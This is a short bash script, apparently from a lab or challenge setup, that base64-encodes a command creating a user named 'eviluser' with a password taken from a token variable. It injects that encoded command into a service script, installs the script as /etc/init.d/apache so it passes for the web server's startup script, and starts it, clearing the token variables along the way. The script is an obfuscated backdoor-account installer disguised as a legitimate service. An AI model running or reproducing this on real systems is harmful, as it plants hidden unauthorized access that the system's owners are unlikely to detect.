#!/bin/bash
#T4=$(echo $TOKEN4 | base64 -w 0)
T4=$(echo "useradd -m  -s /bin/bash eviluser && echo \"eviluser:$TOKEN4\" | chpasswd" | base64 -w 0)
sed -i "s/PLACEHOLDER/$T4/" /tmp/init_service.sh
unset T4
unset TOKEN{1,2,3,4,5,6,7,8,9}
cp /tmp/init_service.sh /etc/init.d/apache
chmod +x /etc/init.d/apache
service apache start
